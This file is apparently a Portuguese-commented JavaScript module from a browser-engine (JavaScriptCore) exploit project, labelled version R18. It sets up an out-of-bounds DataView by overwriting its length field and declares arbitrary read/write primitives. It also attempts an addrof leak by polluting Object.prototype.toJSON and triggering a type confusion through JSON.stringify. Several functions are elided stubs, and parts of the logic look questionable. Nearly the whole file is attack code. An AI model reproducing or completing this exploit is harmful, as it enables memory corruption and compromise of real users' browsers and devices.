// js/core_exploit.mjs (v31.R18 - Depuração OOB em Addrof, Sonda Interna)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false; 

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; 

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { 
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment_R18';
    const wasSetup = isOOBEnvironmentSetup;
    if (!wasSetup && !options.force_clear_even_if_not_setup) return;
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
    log(`[${FNAME_CLEAR}] Ambiente limpo. Setup anterior: ${wasSetup}. Novo: ${isOOBEnvironmentSetup}`, 'info');
}
export function getOOBAllocationSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.INITIAL_BUFFER_SIZE; }

export async function triggerOOB_primitive(options = { force_reinit: false, caller_fname: "Unknown" }) { 
    const FNAME_TRIGGER = `CoreExploit.triggerOOB_primitive(caller:${options.caller_fname})_R18`;
    let currentLength = -1; // Init com valor inválido
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
        try { currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true); } catch(e){ currentLength = -2; /* detached or other read error */ }
    }

    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_array_buffer_real && oob_dataview_real && 
            oob_array_buffer_real.byteLength === getOOBAllocationSize() && 
            oob_dataview_real.buffer === oob_array_buffer_real && 
            currentLength === 0xFFFFFFFF) {
            log(`[${FNAME_TRIGGER}] Ambiente OOB já OK e expandido.`, 'info'); return true;
        } else { 
            log(`[${FNAME_TRIGGER}] OOB Env inconsistente (Setup:${isOOBEnvironmentSetup}, Len:${toHex(currentLength)}, Alloc:${oob_array_buffer_real?.byteLength}). Forçando re-init.`, 'warn'); 
            clearOOBEnvironment({ force_clear_even_if_not_setup: true }); 
        }
    } else if (options.force_reinit) {
        log(`[${FNAME_TRIGGER}] Forçando re-inicialização OOB...`, 'info');
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    }

    log(`[${FNAME_TRIGGER}] Iniciando Config (Anterior Setup: ${isOOBEnvironmentSetup})`, 'test');
    const currentAllocSize = getOOBAllocationSize(); 
    
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize); 
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        isOOBEnvironmentSetup = true; 
        log(`[${FNAME_TRIGGER}] AB e DV criados. isOOBEnvSetup: ${isOOBEnvironmentSetup}`, 'info');

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, 0xFFFFFFFF, true); // Escrita em 0x70
            const writtenLen = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true);
            log(`    m_length do oob_dv (em ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}) setado para 0xFFFFFFFF. Lido de volta: ${toHex(writtenLen)}.`, 'info', FNAME_TRIGGER);
            if (writtenLen !== 0xFFFFFFFF) {
                throw new Error(`Falha ao verificar m_length após escrita. Esperado 0xFFFFFFFF, obtido ${toHex(writtenLen)}`);
            }
        } else { 
            const eMsg = `Falha ao expandir m_length: AllocSize (${currentAllocSize}) pequeno para offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT)}.`; 
            log(eMsg, 'critical', FNAME_TRIGGER); isOOBEnvironmentSetup = false; throw new Error(eMsg); 
        }
        log(`[${FNAME_TRIGGER}] Ambiente OOB CONFIGURADO. isOOBEnvSetup: ${isOOBEnvironmentSetup}`, 'good');
        return true;
    } catch (e) { 
        log(`ERRO CRÍTICO ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER); 
        console.error(e); clearOOBEnvironment({ force_clear_even_if_not_setup: true }); throw e; 
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... (R16) ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... (R16) ... */ }

export function isOOBReady(caller_fname = "Unknown") { 
    const FNAME_ISREADY = `CoreExploit.isOOBReady(caller:${caller_fname})_R18`;
    let mLE = false; 
    let setupFlag = isOOBEnvironmentSetup;
    let abExists = !!oob_array_buffer_real;
    let dvExists = !!oob_dataview_real;
    let abOk = abExists && (oob_array_buffer_real instanceof ArrayBuffer) && oob_array_buffer_real.byteLength > 0;
    let dvOk = dvExists && (oob_dataview_real instanceof DataView);
    let dvBufferOk = abOk && dvOk && (oob_dataview_real.buffer === oob_array_buffer_real);
    let mLengthValue = -1;

    if (setupFlag && abOk && dvOk && dvBufferOk) { 
        try { 
            if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT + 3) {
                mLengthValue = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true);
                mLE = (mLengthValue === 0xFFFFFFFF); 
            } else { mLE = false; /* Buffer muito pequeno para conter o offset */ }
        } catch (e) { log(`[${FNAME_ISREADY}] Erro ao ler m_length: ${e.message}`, 'error'); mLE = false; mLengthValue = -2; /* Erro de leitura */ } 
    }
    const overallReady = setupFlag && abOk && dvOk && dvBufferOk && mLE;
    log(`[${FNAME_ISREADY}] Status: Overall=${overallReady} (Setup=${setupFlag}, AB=${abOk}(Exists:${abExists}), DV=${dvOk}(Exists:${dvExists}), DVBuf=${dvBufferOk}, mLengthExp=${mLE}(Val:${toHex(mLengthValue)}))`, overallReady ? 'info' : 'error');
    return overallReady;
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... */ }

const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... */ }

let _targetObjectForCoreAddrof_R18 = null; 
let _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = false;
let _core_victim_float_view_for_addrof_R18 = null; 
let _core_m1_victim_being_stringified_R18 = null; 
let _probeR18_is_expecting_core_m2_victim = false;
let _probeR18_core_m2_victim_ref_for_check = null;

// Sonda interna para attemptAddrofUsingCoreHeisenbug
function _toJSONProbeForCoreAddrof_R18() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R18";
    let currentThisType = Object.prototype.toString.call(this);
    let isOurExpectedM2TargetByRef = (this === _probeR18_core_m2_victim_ref_for_check); // Compara referência direta

    // Log detalhado do 'this' na sonda
    let thisProps = [];
    try { for (const p in this) { if(this.hasOwnProperty(p)) thisProps.push(p); } } catch(e){}
    log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. Is ref _m2_victim? ${isOurExpectedM2TargetByRef}. Expecting M2 Flag: ${_probeR18_is_expecting_core_m2_victim}. Props: ${thisProps.join(',')}`, "leak");

    if (isOurExpectedM2TargetByRef && currentThisType === '[object Object]' && _probeR18_is_expecting_core_m2_victim && !_core_heisenbug_tc_on_first_expected_object_confirmed_R18) { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para _probeR18_core_m2_victim_ref_for_check! Escrevendo targetObject...`, "vuln");
        _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = true; 
        _probeR18_is_expecting_core_m2_victim = false; 

        if (_targetObjectForCoreAddrof_R18 && _core_victim_float_view_for_addrof_R18) {
            try {
                _core_victim_float_view_for_addrof_R18[0] = _targetObjectForCoreAddrof_R18;
                log(`[${FNAME_PROBE}] targetObject escrito em _core_victim_float_view_for_addrof_R18[0].`, "info");
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
                _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = false; 
            }
        } else { 
            log(`[${FNAME_PROBE}] AVISO: targetObject ou float_view não definidos para escrita.`, "warn");
            _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = false; 
        }
    } else if (isOurExpectedM2TargetByRef && currentThisType !== '[object Object]' && _probeR18_is_expecting_core_m2_victim) {
        log(`[${FNAME_PROBE}] 'this' é _probeR18_core_m2_victim_ref_for_check, mas tipo é ${currentThisType}. TC falhou.`, "warn");
         _probeR18_is_expecting_core_m2_victim = false; 
    }
    return { core_addrof_probe_r18_executed: true };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R18
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R18";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R18...`, "info");

    _targetObjectForCoreAddrof_R18 = targetObject; 
    _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = false; 
    _core_victim_float_view_for_addrof_R18 = null;
    _probeR18_is_expecting_core_m2_victim = false; 
    _probeR18_core_m2_victim_ref_for_check = null;

    let addrof_result = { success: false, message: "Addrof (Heisenbug R18) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R18 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R18 = false;

    try {
        log(`[${FNAME_FUNC}] Fase de setup OOB: Chamando triggerOOB_primitive...`, "info");
        let oobSetupSuccess = false;
        try {
            await triggerOOB_primitive({ force_reinit: true, caller_fname: FNAME_FUNC });
            log(`[${FNAME_FUNC}] triggerOOB_primitive completado. Verificando isOOBReady...`, "info");
            if (isOOBReady(FNAME_FUNC)) {
                oobSetupSuccess = true;
                log(`[${FNAME_FUNC}] Ambiente OOB pronto para Addrof.`, "good");
            } else {
                log(`[${FNAME_FUNC}] isOOBReady() retornou false APÓS triggerOOB_primitive.`, "error");
                // Log adicional para depurar isOOBReady
                log(`[${FNAME_FUNC}] Detalhes: isOOBEnvironmentSetup=${isOOBEnvironmentSetup}, ab_null=${oob_array_buffer_real === null}, dv_null=${oob_dataview_real === null}`, "error");
                if (oob_dataview_real && oob_array_buffer_real) { // Apenas se não forem nulos
                     try { log(`[${FNAME_FUNC}] Detalhes: ab.len=${oob_array_buffer_real.byteLength}, dv.m_len_at_0x70=${oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT, true)}`, "error"); } catch(e) {}
                }
                throw new Error("Falha na verificação isOOBReady pós triggerOOB.");
            }
        } catch (e_oob_setup) {
            log(`[${FNAME_FUNC}] EXCEÇÃO durante setup OOB: ${e_oob_setup.message}`, "critical");
            addrof_result.message = `Erro crítico no setup OOB para Addrof R18: ${e_oob_setup.message}`;
            throw e_oob_setup; // Re-lança para o catch externo principal da função
        }
        
        log(`[${FNAME_FUNC}] Escrevendo valor crítico ${toHexHelper(HEISENBUG_CRITICAL_WRITE_VALUE)} em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC)}...`, "warn");
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        await PAUSE(150); 

        let core_victim_buffer_local = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R18 = new Float64Array(core_victim_buffer_local); 
        _core_victim_float_view_for_addrof_R18.fill(0.3344556677); 
        
        _probeR18_core_m2_victim_ref_for_check = { m2_marker_R18: "unique_M2_for_addrof_probe" }; // Objeto que a sonda vai procurar por referência
        
        let core_m1_victim = { payload_m2_R18: _probeR18_core_m2_victim_ref_for_check };
        log(`[${FNAME_FUNC}] Estrutura M1/M2 criada. Alvo stringify: core_m1_victim.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R18, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R18 = true;
        
        _probeR18_is_expecting_core_m2_victim = true; 
        JSON.stringify(core_m1_victim); 
        _probeR18_is_expecting_core_m2_victim = false; 
        log(`[${FNAME_FUNC}] JSON.stringify concluído. TC Confirmada (Flag): ${_core_heisenbug_tc_on_first_expected_object_confirmed_R18}`, "info");
        
        if (_core_heisenbug_tc_on_first_expected_object_confirmed_R18) {
            const val_double = _core_victim_float_view_for_addrof_R18[0]; 
            // ... (lógica de análise de val_double como na R17)
            addrof_result.leaked_address_as_double = val_double;
            const temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
            const temp_u32_view = new Uint32Array(temp_buf);
            const leaked_addr64 = new AdvancedInt64(temp_u32_view[0], temp_u32_view[1]);
            addrof_result.leaked_address_as_int64 = leaked_addr64;
            log(`[${FNAME_FUNC}] Heisenbug TC INTERNA confirmada e escrita realizada! Lido: Dbl=${val_double}, I64=${leaked_addr64.toString(true)}`, "vuln");
            if (val_double !== 0.3344556677 && (leaked_addr64.low() !== 0 || leaked_addr64.high() !==0) ) {
                const lhi = leaked_addr64.high(); const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                if (!nan_inf) { addrof_result.success = true; addrof_result.message = `Addrof R18 TC OK. Addr Pot: ${leaked_addr64.toString(true)}`; }
                else { addrof_result.message = `Addrof R18 TC OK, mas val ${leaked_addr64.toString(true)} é NaN/Inf.`;}
            } else { addrof_result.message = `Addrof R18 TC OK, mas val (${leaked_addr64.toString(true)}) é preenchimento/0.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda R18 para o objeto esperado."; }
    } catch (e) { 
        log(`[${FNAME_FUNC}] EXCEPTION CATCH (principal): ${e.message || String(e)}`, "critical");
        addrof_result.message = `Erro crítico em Addrof R18: ${e.message || String(e)}`; 
    } 
    finally { /* ... (limpeza como na R17) ... */ }
    log(`[${FNAME_FUNC}] Retornando resultado Addrof R18: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

// getStableConfusedArrayBuffer, get_powerful_dataview_on_oob_buffer, read_memory_with_dataview, write_memory_with_dataview
// (sem alterações da v31.R13/R16)
export async function getStableConfusedArrayBuffer() { /* ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... */ }
